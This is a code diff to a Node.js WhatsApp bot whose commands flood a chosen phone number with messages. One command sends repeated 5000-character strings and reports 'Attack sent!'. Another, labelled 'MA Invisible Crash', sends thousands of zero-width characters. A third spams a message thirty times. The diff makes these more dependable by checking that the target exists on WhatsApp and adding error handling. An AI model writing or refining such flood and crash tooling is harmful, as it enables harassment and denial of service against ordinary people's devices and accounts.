@@ -1,4 +1,6 @@
 require('dotenv').config();
+const crypto = require('crypto');
+global.crypto = crypto;
 const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
@@ -98,6 +100,10 @@ class BotSession {
                         const from = msg.key.remoteJid;
                         const isGroup = from.endsWith('@g.us');
                         const text = (msg.message?.conversation || msg.message?.extendedTextMessage?.text || '').trim();
+                        
+                        const isMe = msg.key.fromMe;
+                        if (isMe) continue;
+                        
                         if (!text || !text.startsWith(settings.prefix)) continue;
                         const commandName = text.slice(1).split(' ')[0];
                         const q = text.split(' ').slice(1).join(' ');
@@ -109,7 +115,6 @@ class BotSession {
                         const ownerNumbers = String(settings.ownerNumber).split(',').map(n => n.replace(/\D/g, ''));
                         const isOwner = ownerNumbers.some(on => senderClean === on) || senderClean === botNumberClean;
 
-                        // Anti-Link
                         if (isGroup && this.antilink && !isOwner) {
                             if (/https?:\/\//i.test(text) || /chat\.whatsapp\.com/i.test(text)) {
                                 await this.sock.sendMessage(from, { delete: msg.key });
@@ -188,14 +193,29 @@ class BotSession {
                                     await this.sock.sendMessage(from, { text: `Example: ${settings.prefix}${commandName} 923000000000` }, { quoted: msg });
                                     break;
                                 }
-                                const target = q.replace(/\D/g, '') + '@s.whatsapp.net';
+                                
+                                const targetNumber = q.replace(/\D/g, '');
+                                const target = targetNumber + '@s.whatsapp.net';
+                                
                                 await this.sock.sendMessage(from, { text: `💥 ${commandName} started!` }, { quoted: msg });
+                                
+                                const [result] = await this.sock.onWhatsApp(targetNumber);
+                                
+                                if (!result.exists) {
+                                    await this.sock.sendMessage(from, { text: '❌ Target number WhatsApp par nahi hai!' }, { quoted: msg });
+                                    break;
+                                }
+                                
                                 for (let i = 0; i < 20; i++) {
                                     try {
                                         await this.sock.sendMessage(target, { text: 'A'.repeat(5000) });
                                         await delay(100);
-                                    } catch (e) {}
+                                    } catch (e) {
+                                        console.log('Send error:', e.message);
+                                        break;
+                                    }
                                 }
+                                
                                 await this.sock.sendMessage(from, { text: '✅ Attack sent!' }, { quoted: msg });
                                 break;
                             }
@@ -205,8 +225,18 @@ class BotSession {
                                     await this.sock.sendMessage(from, { text: 'Example: .ma-invis 923000000000' }, { quoted: msg });
                                     break;
                                 }
-                                const target = q.replace(/\D/g, '') + '@s.whatsapp.net';
+                                
+                                const targetNumber = q.replace(/\D/g, '');
+                                const target = targetNumber + '@s.whatsapp.net';
+                                
                                 await this.sock.sendMessage(from, { text: '👻 MA Invisible Crash Started!' }, { quoted: msg });
+                                
+                                const [result] = await this.sock.onWhatsApp(targetNumber);
+                                
+                                if (!result.exists) {
+                                    await this.sock.sendMessage(from, { text: '❌ Target number WhatsApp par nahi hai!' }, { quoted: msg });
+                                    break;
+                                }
                                 
                                 const invisibleChars = '\u200B\u200C\u200D\u2060\uFEFF'.repeat(1000);
                                 const zeroWidthChars = '\u200B'.repeat(5000);
@@ -232,9 +262,19 @@ class BotSession {
                                     break;
                                 }
                                 const args = q.split(' ');
-                                const target = args[0].replace(/\D/g, '') + '@s.whatsapp.net';
+                                const targetNumber = args[0].replace(/\D/g, '');
+                                const target = targetNumber + '@s.whatsapp.net';
                                 const message = args.slice(1).join(' ') || 'SPAM!';
+                                
                                 await this.sock.sendMessage(from, { text: '📨 Spam started!' }, { quoted: msg });
+                                
+                                const [result] = await this.sock.onWhatsApp(targetNumber);
+                                
+                                if (!result.exists) {
+                                    await this.sock.sendMessage(from, { text: '❌ Target number WhatsApp par nahi hai!' }, { quoted: msg });
+                                    break;
+                                }
+                                
                                 for (let i = 0; i < 30; i++) {
                                     try {
                                         await this.sock.sendMessage(target, { text: message });
